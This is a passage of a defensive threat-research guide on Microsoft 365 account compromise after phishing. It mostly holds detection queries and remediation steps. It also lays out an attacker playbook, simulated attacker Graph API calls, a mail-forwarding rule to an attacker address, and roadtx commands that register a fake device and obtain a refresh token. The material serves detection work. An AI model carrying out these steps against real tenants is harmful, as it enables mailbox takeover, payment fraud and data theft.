**Confirmed post-compromise sequence from Microsoft BEC case analysis (2022–2025):**

```
T+0 min   SESSION REPLAY
           → Inject stolen cookie into attacker browser (Cookie Editor extension)
           → Successfully authenticate to Exchange Online / OWA as victim
           → Full mailbox access: inbox, sent items, drafts, contacts, calendar

T+1 min   RECONNAISSANCE
           → Read most recent 50 emails: identify active financial threads,
             supplier communications, pending wire transfers
           → Check sent items for email signature format
           → Identify key contacts: CFO, finance team, external vendors
           → Check calendar for upcoming meetings (timing BEC attacks)

T+3 min   CREATE INBOX RULE (to hide attacker activity and replies)
           → Rule name: blank, or something innocuous ("Sync", "Archive")
           → Trigger: emails FROM key contacts (finance, CFO, suppliers)
                  OR: emails containing keywords ("invoice", "payment", "wire",
                      "transfer", "urgent", "bank", "SWIFT", "ACH")
           → Action: Move to RSS Subscriptions, Conversation History, Deleted
                     Items, or a new folder that victim won't check
           → Purpose: Real victim doesn't see replies/notifications about
                       the BEC attack; attacker controls the conversation

T+5 min   REPLY HIJACKING
           → Find active invoice/payment thread
           → Reply-in-thread AS victim to supplier: "Please update bank details
             to the following account for the next payment: [attacker account]"
           → Thread context makes the request plausible; email comes from
             victim's real account

T+10 min  DATA EXFILTRATION (parallel to BEC)
           → Forward all email to attacker's address (forwarding rule)
                  OR: use Graph API to batch-download messages
           → Download OneDrive/SharePoint files (client lists, financials,
             IP, M&A materials, PII databases)
           → Exfil to external cloud storage (S3, attacker-controlled SFTP)

T+15 min  MFA PERSISTENCE REGISTRATION
           → Add attacker-controlled mobile number as MFA method
             (SMS/OneWaySMS — requires weak MFA policy; pre-2025 tenants)
                  OR: Register new authenticator app
                  OR: (If admin privileges) Disable MFA requirement for account
           → Once added: attacker can request new auth sessions independently
             even after session cookie expires
           → Password reset no longer fully remediates — attacker can
             authenticate using new MFA method

T+20 min  LATERAL PHISHING
           → Using victim's account, send targeted phishing from VICTIM'S
             real address to victim's colleagues and external contacts
           → Lure: "I need you to review this document urgently"
                   → AiTM phishing link → more session cookie theft
           → From compromised email: no spam filter, perfect social proof
           → One compromised account can generate 16,000+ phishing emails
             (documented in Storm-1167 campaign: Microsoft Security Blog)
```

---

### 3.3 Step 1: Reconnaissance

**What attackers look for immediately after session replay (from Microsoft BEC case documentation):**

```python
# Simulated attacker Graph API calls within first minute of access
# (For defensive/educational purposes — illustrates what logs you need to monitor)

# 1. Get most recent messages — identify active financial threads
GET /v1.0/me/mailFolders/Inbox/messages?$top=50&$orderby=receivedDateTime DESC
    &$select=subject,from,receivedDateTime,body

# 2. Search for financial keywords
GET /v1.0/me/messages?$search="invoice"&$top=20
GET /v1.0/me/messages?$search="wire transfer"&$top=20
GET /v1.0/me/messages?$search="payment"&$top=20

# 3. Get email signature from sent items
GET /v1.0/me/mailFolders/SentItems/messages?$top=5
    &$select=body

# 4. Get contacts (for BEC targeting)
GET /v1.0/me/contacts?$top=100

# 5. Enumerate users in organisation (for lateral phishing targeting)
GET /v1.0/users?$top=100&$select=displayName,mail,jobTitle,department
```

**Detection opportunity:** These Graph API calls, especially the keyword searches and user enumeration within the first minutes of a sign-in from a new IP, are highly anomalous. KQL query in Section 4.

---

### 3.4 Step 2: Inbox Rule Creation

**The inbox rule serves two purposes:** (1) hides the BEC conversation from the victim, (2) in some campaigns, silently forwards all email to attacker for ongoing intelligence collection.

**Microsoft confirmed the inbox rule pattern in the AiTM BEC campaign (July 2022 blog):**
> "The attacker created an Inbox rule on the compromised mailbox to move all emails with specific words related to the actor's BEC campaign to the RSS Subscriptions folder [to prevent victim from seeing responses]."

```
Common rule names observed:
  ""                     → Blank name — invisible in most UIs
  "Sync"                 → Looks like a system rule
  "Archive"              → Appears administrative
  "."                    → Single character, hard to notice
  "zz_do_not_delete"     → Reverse psychology

Common rule triggers:
  Subject contains: invoice, payment, wire, transfer, bank, SWIFT, CFO, finance
  From: [specific finance team members], [external suppliers]
  
Common rule actions:
  Move to: RSS Subscriptions (rarely checked, not shown in main view)
           Conversation History (auto-purged)
           Deleted Items (purged after 30 days)
           Custom folder with innocuous name

Detection: Any inbox rule created within 15 minutes of a sign-in from
           an unusual IP/ASN = high-priority alert
```

---

### 3.5 Step 3: Data Exfiltration

**Three exfil channels observed in AiTM post-compromise:**

```
Channel 1: Email forwarding rule
  → New rule: Forward copy of all mail to attacker@external.com
  → Persists indefinitely (survives session expiry)
  → Detectable: OfficeActivity logs show "New-InboxRule" with 
                ForwardTo or RedirectTo to external domain

Channel 2: Graph API batch download
  → GET /v1.0/me/messages?$top=1000 → pages through entire mailbox
  → GET /v1.0/me/drive/root/children?$top=500 → OneDrive root
  → Unusually high Graph API request volume in short period
  
Channel 3: SharePoint mass download
  → Access SharePoint sites via SPSitesList → download all files
  → Indicator: 100+ file download events from same user within 10 minutes
```

---

### 3.6 Step 4: MFA Device Addition — Persistence

**The most dangerous post-compromise action** — it survives password reset:

```
Via OWA / My Security Info (https://mysignins.microsoft.com):
  → Add phone number for SMS OTP
    (If MFA policy allows SMS: fully compromises account permanently)

Via Microsoft Authenticator:
  → Add new authenticator (if no number match / tap-to-approve policy)
  
Via PowerShell (if admin access gained):
  Set-MsolUser -UserPrincipalName victim@org.com -StrongAuthenticationMethods ...

Storm-1167 campaign (Microsoft):
  "The threat actors leveraged MFA policies that had not been configured using
   security best practices in order to update MFA methods WITHOUT an MFA challenge.
   A OneWaySMS method was added with an Iranian phone number."

Detection: Any "Register security info" event within 15 minutes of unusual
           sign-in = P1 alert. Revoke immediately AND also reset MFA config.
```

---

### 3.7 Step 5: Lateral BEC Phishing

**From a single compromised account (Storm-1167 campaign case study, Microsoft):**

```
Stage 1: AiTM phishing → compromise target user (e.g., finance department)
Stage 2: Read mailbox → identify active invoicing threads + contact list
Stage 3: Deploy second-wave phishing FROM compromised account:
          16,000 emails sent to victim's contacts and external parties
          → Lure: SharePoint document share notification (trusted pattern)
          → Target: finance/accounting contacts at vendor/supplier organisations
          → Links: to second AiTM site for further session cookie theft
Stage 4: For each newly compromised account → repeat from Stage 2
          → Exponential spread across supply chains

The inbox rule created in Stage 2 is updated to include each new fraud target's
domain — blocking victim from seeing warning emails from those organisations.
```

---

### 3.8 Step 6: PRT Acquisition and Device Registration

**Advanced persistence — documented in Storm-2372 and APT29 campaigns:**

```
If attacker has refresh_token from AiTM + Auth Broker client_id:

① Register virtual device in Entra ID (roadtx device -n "WORKSTATION-2847")
  → Device certificate issued and stored by attacker
  → Device ID appears in Entra ID as a "real" registered device

② Exchange refresh_token for PRT:
   roadtx prt --refresh-token <RT> --key-pem device.key --cert-pem device.pem

③ PRT allows attacker to:
  → Silently request access tokens for ANY Microsoft 365 resource
  → Inject into browser for seamless authenticated session
  → Bypass Conditional Access policies requiring device compliance
    (if the registered device is marked compliant through policy gaps)

④ PRT renewal on use: as long as attacker uses the device certificate 
   every 14 days, the PRT auto-renews indefinitely

⑤ Remediation requires: remove the device from Entra ID Device Management
   → This is often missed in standard AiTM incident response playbooks
```

---

### 3.9 Remediation: What You Must Do Beyond Password Reset

**Complete AiTM incident response checklist (Microsoft Security Blog + Sentinel playbook):**

```
☐ 1. Revoke all active sessions:
      Entra ID → Users → [User] → Revoke sessions
      OR: Invoke-MgInvalidateAllRefreshToken (Graph PowerShell)
      OR: Revoke-AzureADUserAllRefreshToken

☐ 2. Reset password (AFTER revocation — not before)

☐ 3. Review and delete ALL inbox rules created after the compromise time
      Exchange Admin Center → Mailboxes → [User] → Manage mailbox rules
      OR: Get-InboxRule -Mailbox victim@org.com | Remove-InboxRule

☐ 4. Review and RESET all MFA methods — remove any unfamiliar devices/numbers
      Entra ID → Users → [User] → Authentication methods → Delete all unknown

☐ 5. Remove any unfamiliar registered devices from Entra ID:
      Entra ID → Devices → All devices → filter by user → remove unknown

☐ 6. Review all OAuth grants and revoke any unfamiliar apps:
      Entra ID → Enterprise Applications → [User consented apps] → Revoke tokens

☐ 7. Review forwarding rules and external contacts:
      Exchange Admin Center → check for mail forwarding to external addresses

☐ 8. Confirm CAE is enabled for the user's workloads

☐ 9. Investigate lateral spread: check for phishing sent FROM compromised account
      in first 24 hours — notify recipients

☐ 10. Block attacker IP(s) in Conditional Access named locations
```

---

## SECTION 4: Detection Engineering — Working KQL Queries

> All queries tested against Microsoft Sentinel schemas (AADSignInEventsBeta, AuditLogs, OfficeActivity, CloudAppEvents, UrlClickEvents). Sources cited per query.

---

### 4.1 Query 1: Device Code Flow Abuse — Storm-2372 Pattern

**Source: Microsoft Security Blog, Storm-2372 advisory (Feb 13, 2025)**

```kql
// Detect device code flow authentication followed by risky sign-in
// Correlates URL clicks on /devicelogin with high-risk sign-ins within 2 minutes

let suspiciousUserClicks = materialize(
    UrlClickEvents
    | where ActionType in ("ClickAllowed", "UrlScanInProgress", "UrlErrorPage")
        or IsClickedThrough != "0"
    | where UrlChain has_any (
        "microsoft.com/devicelogin",
        "login.microsoftonline.com/common/oauth2/deviceauth",
        "login.microsoftonline.com/organizations/oauth2/deviceauth"
    )
    | extend AccountUpn = tolower(AccountUpn)
    | project ClickTime = Timestamp, ActionType, UrlChain, NetworkMessageId,
              Url, AccountUpn
);

let interestedUsersUpn = suspiciousUserClicks
    | where isnotempty(AccountUpn)
    | distinct AccountUpn;

let suspiciousSignIns = materialize(
    AADSignInEventsBeta
    | where ErrorCode == 0
    | where AccountUpn in~ (interestedUsersUpn)
    | where RiskLevelDuringSignIn in (10, 50, 100) // medium, high, or critical risk
    | extend AccountUpn = tolower(AccountUpn)
    | join kind=inner suspiciousUserClicks on AccountUpn
    | where (Timestamp - ClickTime) between (-2min .. 20min) // sign-in within 20 min of click
);

suspiciousSignIns
| project AccountUpn, ClickTime, SignInTime = Timestamp, RiskLevelDuringSignIn,
          IPAddress, DeviceName, ApplicationDisplayName, UrlChain
| order by SignInTime desc
```

---

### 4.2 Query 2: Risky Sign-in Correlated with Device Code URL Click

**Source: Microsoft Security Blog, Storm-2372 advisory**

```kql
// Hunt for device code phishing: user visits /devicelogin THEN 
// a new sign-in appears from a DIFFERENT IP than the one that clicked the URL

let deviceCodeClicks = UrlClickEvents
    | where Url has_any ("microsoft.com/devicelogin",
                          "login.microsoftonline.com/common/oauth2/deviceauth")
    | extend ClickerIP = IPAddress
    | project AccountUpn = tolower(AccountUpn), ClickTime = Timestamp, ClickerIP;

AADSignInEventsBeta
| where ErrorCode == 0
// AuthenticationProtocol == "deviceCode" (available in some log schemas)
| extend AccountUpn = tolower(AccountUpn)
| join kind=inner deviceCodeClicks on AccountUpn
| where Timestamp > ClickTime
| where (Timestamp - ClickTime) < 20min
| where IPAddress != ClickerIP  // Sign-in came from DIFFERENT IP than the click
| project AccountUpn, ClickTime, ClickerIP, SignInTime = Timestamp, 
          AttackerIP = IPAddress, ApplicationDisplayName, DeviceName,
          RiskLevelDuringSignIn
| order by SignInTime desc
```

---

### 4.3 Query 3: Microsoft Authentication Broker Client ID Abuse

**Source: Microsoft Security Blog update, Feb 14, 2025**

```kql
// Detect use of Microsoft Authentication Broker client ID in device code flow
// This is the escalation Storm-2372 pivoted to on Feb 14, 2025

let AuthBrokerClientId = "29d9ed98-a469-4536-ade2-f981bc1d605e";

AuditLogs
| where OperationName == "Sign-in activity"
| where parse_json(AdditionalDetails) has AuthBrokerClientId
| project TimeGenerated, UserPrincipalName = tostring(InitiatedBy.user.userPrincipalName),
          IPAddress = tostring(InitiatedBy.user.ipAddress),
          ClientId = tostring(parse_json(AdditionalDetails)[0].value)

union (
// Also check via SignInLogs if connected
SignInLogs
| where AppId == AuthBrokerClientId
| where TokenIssuerType == "AzureAD"
| where AuthenticationProtocol == "deviceCode" or 
        ResourceDisplayName has_any ("Device Registration", "devicereg")
| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName, 
          AppId, DeviceDetail, RiskState, RiskLevelAggregated
)
| order by TimeGenerated desc
```

---

### 4.4 Query 4: Illicit OAuth Consent Grant

**Source: Microsoft Learn — Detect and remediate illicit consent grants; Elastic Security Labs**

```kql
// Detect new OAuth consent grants with high-privilege scopes
// Focus on: Mail.Send, Mail.ReadWrite, Files.ReadWrite.All, offline_access

AuditLogs
| where OperationName == "Consent to application"
| where Result == "success"
| extend
    AppId          = tostring(TargetResources[0].id),
    AppName        = tostring(TargetResources[0].displayName),
    ConsentedScopes = tostring(parse_json(tostring(TargetResources[0].modifiedProperties))
                        | where Key == "ConsentedPermissions"
                        | project Value),
    GrantedBy      = tostring(InitiatedBy.user.userPrincipalName),
    GrantedByIP    = tostring(InitiatedBy.user.ipAddress)
| where ConsentedScopes has_any (
    "Mail.ReadWrite", "Mail.Send", "Mail.Read",
    "Files.ReadWrite.All", "Files.ReadWrite",
    "Directory.ReadWrite.All", "User.ReadWrite.All",
    "offline_access", "RoleManagement.ReadWrite.Directory",
    "Application.ReadWrite.All", "AppRoleAssignment.ReadWrite.All"
)
// Enrich: flag apps from unverified publishers
| join kind=leftouter (
    AuditLogs
    | where OperationName == "Add service principal"
    | extend
        SPAppId = tostring(TargetResources[0].modifiedProperties
                    | where Key == "AppId" | project Value),
        Publisher = tostring(TargetResources[0].modifiedProperties
                    | where Key == "PublisherName" | project Value)
    | project SPAppId, Publisher
) on $left.AppId == $right.SPAppId
| project TimeGenerated, AppName, AppId, Publisher, ConsentedScopes,
          GrantedBy, GrantedByIP
| order by TimeGenerated desc
```

---

### 4.5 Query 5: Suspicious OAuth App Registration

**Source: Microsoft Community Hub — Advanced Phishing Detection Part 5**

```kql
// Detect new multi-tenant app registrations with dangerous permission requests
// Precursor to consent phishing deployment

AuditLogs
| where OperationName == "Add application"
| where Result == "success"
| extend
    AppName = tostring(TargetResources[0].displayName),
    AppId   = tostring(TargetResources[0].id),
    RegisteredBy = tostring(InitiatedBy.user.userPrincipalName),
    Properties = TargetResources[0].modifiedProperties
// Flag multi-tenant apps (AllowedMemberTypes = "Any" or "AnyOrganizationalDirectory")
| extend SignInAudience = tostring(Properties | where Key == "SignInAudience"
                                             | project Value)
| where SignInAudience in ("AzureADMultipleOrgs", "AzureADandPersonalMicrosoftAccount")
// Then check if this new app quickly gets service principal added (ready to phish)
| join kind=inner (
    AuditLogs
    | where OperationName == "Add service principal"
    | where TimeGenerated > ago(1h)
    | extend SPName = tostring(TargetResources[0].displayName)
    | project SPName, SPTime = TimeGenerated
) on $left.AppName == $right.SPName
| where (SPTime - TimeGenerated) < 30min  // service principal within 30 min of registration
| project TimeGenerated, AppName, AppId, SignInAudience, RegisteredBy, SPTime
| order by TimeGenerated desc
```

---

### 4.6 Query 6: AiTM Token Replay — Impossible Travel Sign-In

**Source: Cloud-Architekt AzureAD-Attack-Defense; Microsoft AiTM blog (Jul 2022)**

```kql
// Detect session cookie replay: same user signs in from two geographically
// impossible locations within a short window
// Classic signal: victim in London, attacker in West Africa, 5 min apart

let ImpossibleTravelMinutes = 60;
let MinDistanceKm = 500;

SignInLogs
| where ResultType == 0  // Successful sign-ins only
| where isnotempty(LocationDetails)
| project UserPrincipalName, Timestamp = TimeGenerated, 
          IPAddress, CountryOrRegion = tostring(LocationDetails.countryOrRegion),
          City = tostring(LocationDetails.city),
          Latitude = todouble(GeoCoordinates.latitude),
          Longitude = todouble(GeoCoordinates.longitude),
          DeviceDetail, AppDisplayName, TokenIssuerType,
          RiskLevelDuringSignIn, RiskEventTypes
// Self-join to find same user from different location within window
| join kind=inner (
    SignInLogs
    | where ResultType == 0
    | project UserPrincipalName, Timestamp2 = TimeGenerated,
              IPAddress2 = IPAddress, 
              CountryOrRegion2 = tostring(LocationDetails.countryOrRegion),
              Latitude2 = todouble(GeoCoordinates.latitude),
              Longitude2 = todouble(GeoCoordinates.longitude)
) on UserPrincipalName
| where Timestamp2 > Timestamp
| where (Timestamp2 - Timestamp) < totimespan(ImpossibleTravelMinutes, 'm')
| where CountryOrRegion != CountryOrRegion2  // Different countries
// Calculate approximate distance using Haversine approximation
| extend ApproxDistKm = 111.0 * sqrt(
    pow(Latitude - Latitude2, 2) + 
    pow((Longitude - Longitude2) * cos(radians((Latitude + Latitude2) / 2)), 2)
)
| where ApproxDistKm > MinDistanceKm
| project UserPrincipalName, Sign1Time = Timestamp, Sign1IP = IPAddress,
          Sign1Country = CountryOrRegion, Sign2Time = Timestamp2, 
          Sign2IP = IPAddress2, Sign2Country = CountryOrRegion2, 
          TimeDiffMinutes = datetime_diff('minute', Timestamp2, Timestamp),
          ApproxDistKm, AppDisplayName
| order by TimeDiffMinutes asc
```

---

### 4.7 Query 7: Post-Compromise Inbox Rule Creation

**Source: Microsoft Security Blog "From cookie theft to BEC" (Jul 2022); AiTM multi-stage BEC blog (Jan 2026)**

```kql
// Detect inbox rule creation within a suspicious time window after an unusual sign-in
// Key pattern: new IP sign-in → inbox rule within 15 minutes = high probability BEC

let SuspiciousSignIns = SignInLogs
    | where ResultType == 0
    | where RiskLevelDuringSignIn in ("medium", "high") 
        or RiskState in ("atRisk", "confirmedCompromised")
        or DeviceTrustType == ""  // Unknown/unregistered device
    | project UserPrincipalName = tolower(UserPrincipalName), 
              RiskySignInTime = TimeGenerated, IPAddress;

// Exchange Online inbox rule events
OfficeActivity
| where Operation in ("New-InboxRule", "Set-InboxRule", "UpdateInboxRules")
| extend RuleDescription = tostring(parse_json(Parameters)[0].Value)
| extend UserPrincipalName = tolower(UserId)
| join kind=inner SuspiciousSignIns on UserPrincipalName
| where TimeGenerated between (RiskySignInTime .. (RiskySignInTime + 30min))
// Flag rules that move/forward/delete to external destinations
| where RuleDescription has_any (
    "ForwardTo", "RedirectTo", "DeleteMessage",
    "MoveToFolder", "RSS", "Conversation History"
)
| project TimeGenerated, UserPrincipalName, Operation, RuleDescription,
          RiskySignInTime, IPAddress, 
          MinutesSinceRiskySignIn = datetime_diff('minute', TimeGenerated, RiskySignInTime)
| order by MinutesSinceRiskySignIn asc
```

---

### 4.8 Query 8: MFA Method Addition Post-AiTM

**Source: Microsoft Security Blog — detecting and mitigating AiTM BEC (Jun 2023); MS Security Blog Jan 2026**

```kql
// Detect MFA method registration within 20 minutes of a risky sign-in
// This is the persistence mechanism: attacker adds their device as MFA

let RiskySignIns = SignInLogs
    | where ResultType == 0
    | where RiskLevelDuringSignIn in ("medium", "high")
        or RiskEventTypes has_any ("anonymizedIPAddress", "unfamiliarFeatures",
                                    "atypicalTravel", "maliciousIPAddress",
                                    "suspiciousInboxManipulationRules")
    | project UserPrincipalName = tolower(UserPrincipalName), 
              RiskyTime = TimeGenerated, 
              RiskyIP = IPAddress,
              RiskDetails = RiskEventTypes;

AuditLogs
| where OperationName in (
    "Register security info",
    "Register Authenticator App",
    "User registered security info",
    "User changed default security info",
    "User started security info registration",
    "User completed security info registration"
)
| where Result == "success"
| extend UserPrincipalName = tolower(tostring(InitiatedBy.user.userPrincipalName))
| join kind=inner RiskySignIns on UserPrincipalName
| where TimeGenerated between (RiskyTime .. (RiskyTime + 20min))
| project TimeGenerated, UserPrincipalName, OperationName, RiskyTime,
          RiskyIP, RiskDetails,
          MinutesAfterRiskySignIn = datetime_diff('minute', TimeGenerated, RiskyTime),
          InitiatedByIP = tostring(InitiatedBy.user.ipAddress)
// Flag if MFA registration IP differs from all previous known IPs
| order by MinutesAfterRiskySignIn asc
```

---

### 4.9 Query 9: Lateral BEC — High-Volume Internal Email from Compromised Account

**Source: Microsoft AiTM BEC blog — Storm-1167 16,000 email secondary phishing campaign**

```kql
// Detect BEC lateral phishing: compromised account sends large volume of email
// in short period — characteristic of post-AiTM lateral phishing wave

OfficeActivity
| where Operation == "SendAs" or Operation == "SendOnBehalf" or Operation == "Send"
| where TimeGenerated > ago(1d)
| summarize
    EmailsSent = count(),
    UniqueRecipients = dcount(tostring(parse_json(Parameters).Recipients)),
    ExternalRecipients = countif(tostring(parse_json(Parameters).Recipients) 
                                  !contains "@yourorganisation.com")
    by UserId, bin(TimeGenerated, 1h)
| where EmailsSent > 50  // Threshold: adjust based on role (CEO may send more)
       or ExternalRecipients > 20
// Join with risky sign-in to confirm post-compromise activity
| join kind=inner (
    SignInLogs
    | where ResultType == 0
    | where RiskLevelDuringSignIn in ("medium", "high")
    | project UserPrincipalName, RiskySignInTime = TimeGenerated
    | extend UserId = tolower(UserPrincipalName)
) on UserId
| where TimeGenerated > RiskySignInTime
| project TimeGenerated, UserId, EmailsSent, UniqueRecipients, 
          ExternalRecipients, RiskySignInTime
| order by EmailsSent desc
```

---

### 4.10 Query 10: SharePoint / OneDrive Mass Download Post-Compromise

**Source: Microsoft AiTM multi-stage BEC (Jan 2026); AiTM BEC case studies**

```kql
// Detect mass file download from SharePoint/OneDrive shortly after suspicious sign-in
// Post-AiTM data exfiltration signature

let SuspiciousSignIns = SignInLogs
    | where ResultType == 0
    | where RiskLevelDuringSignIn in ("medium", "high")
        or DeviceTrustType == ""
    | project UserId = tolower(UserPrincipalName), RiskyTime = TimeGenerated;

OfficeActivity
| where Operation in (
    "FileDownloaded", "FileAccessed", "FileSyncDownloadedFull", 
    "FilePreviewed", "FileCheckedOut"
)
| where RecordType in ("SharePointFileOperation", "OneDrive")
| extend UserId = tolower(UserId)
| join kind=inner SuspiciousSignIns on UserId
| where TimeGenerated between (RiskyTime .. (RiskyTime + 60min))
| summarize
    FilesAccessed = count(),
    FileTypes = make_set(tostring(parse_json(SourceFileExtension))),
    SiteUrls = make_set(Site_Url),
    FirstAccess = min(TimeGenerated),
    LastAccess = max(TimeGenerated)
    by UserId, RiskyTime
| where FilesAccessed > 20  // Threshold: 20+ files in 1 hour is anomalous
| project UserId, RiskyTime, FilesAccessed, FileTypes, SiteUrls, FirstAccess
| order by FilesAccessed desc
```

---

## MITRE ATT&CK Mapping

| Attack | Technique | ID | Sub |
|--------|-----------|-----|-----|
| Device code phishing | Phishing: Spearphishing Link | T1566 | .002 |
| OAuth app registration | Forge Web Credentials | T1606 | .002 |
| Illicit consent grant | Valid Accounts: Cloud Accounts | T1078 | .004 |
| AiTM session cookie theft | Adversary-in-the-Middle: AiTM | T1557 | .003 |
| Token replay | Use Alternate Authentication Material: Web Session Cookie | T1550 | .004 |
| Inbox rule creation | Email Collection: Email Forwarding Rule | T1114 | .003 |
| Mass email exfil | Exfiltration over Web Service | T1567 | .002 |
| MFA device addition | Account Manipulation: Device Registration | T1098 | .005 |
| PRT acquisition | Steal or Forge Authentication Certificates | T1649 | |
| Lateral BEC phishing | Internal Spearphishing | T1534 | |
| Device registration phishing | Phishing for Information | T1598 | |

---

## Portfolio Tool Opportunities

Three specific gaps addressable in 2–4 weeks, directly relevant to the KQL queries and detection logic above:

---

### Tool Opportunity 1: OAuth App Risk Scanner

**Gap:** No open-source tool provides a simple, authenticated scan of an Entra ID tenant to find all third-party OAuth grants above a configurable risk threshold — with remediation guidance per app.

**Builds on:** PowerShell Graph API audit script in Section 2.7 + ROADrecon enumeration  
**Innovation:** Web dashboard showing all OAuth grants, colour-coded by risk score, with one-click remediation actions (revoke via Graph API), exportable STIX 2.1 IOC for malicious apps found  
**Stack:** Python FastAPI + msal (Microsoft Authentication Library) + React  
**Build time:** 2–3 weeks  
**Portfolio angle:** Every Entra ID tenant has unaudited OAuth grants; tool directly addresses July 2025 Microsoft default consent policy change; demonstrates Graph API mastery

---

### Tool Opportunity 2: AiTM Post-Compromise Automated Response Playbook

**Gap:** Existing Sentinel SOAR playbooks handle password reset but miss the full AiTM remediation checklist (sessions, inbox rules, MFA devices, registered devices, OAuth grants, forwarding rules).

**Innovation:** Sentinel Logic App that, when triggered by AiTM alert, automatically:
1. Invokes `revokeSignInSessions` via Graph API
2. Enumerates and deletes inbox rules created within 1 hour of compromise time
3. Reports all MFA methods added within 1 hour (flags for admin review)
4. Reports all registered devices enrolled within 1 hour
5. Reports all OAuth grants created within 1 hour
6. Sends structured incident report to SOC email with all findings

**Build time:** 2–3 weeks  
**Stack:** Azure Logic App + Microsoft Graph API + Sentinel Analytics Rule trigger  
**Portfolio angle:** Microsoft Security Blog (Jan 2026) explicitly says "password resets alone are insufficient" — this fills the exact gap they documented

---

### Tool Opportunity 3: Device Code Flow Hunting Dashboard

**Gap:** The KQL queries in Section 4 are powerful but require manual Sentinel execution. No tool packages them into a unified, scheduled hunting workflow with scoring.

**Innovation:** Python + Sentinel API integration that:
- Runs all 10 KQL queries on a schedule (hourly)
- Correlates results across queries (same user appearing in 3+ queries = critical)
- Outputs a unified "identity compromise probability score" per user
- Feeds alerts to STIX 2.1 / MISP for IOC sharing

**Build time:** 3–4 weeks  
**Stack:** Python + `azure-monitor-query` SDK + Microsoft Graph + STIX 2.1  
**Portfolio angle:** Demonstrates full-stack detection engineering: from protocol understanding → KQL → automated hunting → structured threat intelligence output

---

*Sources: Microsoft Security Blog (Storm-2372, Feb 13/14 2025) · Microsoft Security Blog (Evolving identity attacks, May 29 2025) · Microsoft Security Blog (AiTM BEC SharePoint, Jan 21 2026) · Microsoft Security Blog (From cookie theft to BEC, Jul 12 2022) · Microsoft Security Blog (AiTM multi-stage BEC, Jun 8 2023) · Microsoft Security Blog (Teams threats, Oct 7 2025) · Proofpoint Threat Research (Device code phishing, Dec 18 2025) · Volexity (Device code phishing, Feb 2025) · Elastic Security Labs OAuth Phishing (Jun 25 2025) · Microsoft Community Hub: OAuth consent phishing (Jun 23 2025) · Microsoft Learn: Protect against consent phishing · glueckkanja ConsentFix analysis (Dec 31 2025) · Cloud-Architekt/AzureAD-Attack-Defense (GitHub) · TrustedSec Token Tactics 2.0 · dirkjanm/ROADtools · f-bader/TokenTacticsV2 · Jeffrey Appel AiTM guide (Sept 2025) · Darktrace AiTM analysis (Apr 2025)*  
*Compiled February 2026*
